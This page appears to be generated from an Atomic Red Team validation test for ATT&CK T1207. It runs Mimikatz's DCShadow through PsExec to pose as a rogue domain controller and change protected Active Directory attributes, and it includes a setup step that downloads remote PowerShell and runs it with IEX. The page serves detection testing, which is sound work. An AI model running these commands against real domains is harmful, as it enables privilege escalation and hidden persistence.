---
atomic_guid: "0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6"
title: "DCShadow (Active Directory)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1207"
attack_technique_name: "Rogue Domain Controller"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1207/T1207.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6"
  - "DCShadow (Active Directory)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.

[DCShadow](https://www.dcshadow.com/)
[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)

It will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:
Get-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount

Need SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.
The easiest is to run elevated and as a Domain Admin user.

## ATT&CK Mapping

- [[kb/attack/techniques/T1207-rogue_domain_controller|T1207: Rogue Domain Controller]]

## Input Arguments

### attribute

- description: Object attribute to edit, interesting ones: badpwdcount, primaryGroupId, SIDHistory...
- type: string
- default: badpwdcount

### mimikatz_path

- description: Mimikatz windows executable
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe

### object

- description: Targeted object (for machine account do not forget to add final '$')
- type: string
- default: bruce.wayne

### psexec_path

- description: Path to PsExec
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe

### value

- description: Value to assign to object attribute
- type: string
- default: 9999

## Dependencies

Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

### Prerequisite Check

```powershell
$mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
$releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
```

PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})

### Prerequisite Check

```powershell
if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
```

### Get Prerequisite

```powershell
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "#{psexec_path}" -Force
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
# starting fake DC server, as SYSTEM (required)
$dc_output_file = "PathToAtomicsFolder\..\ExternalPayloads\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& "#{mimikatz_path}" "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"
```

### Cleanup

```powershell
Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1207/T1207.yaml)
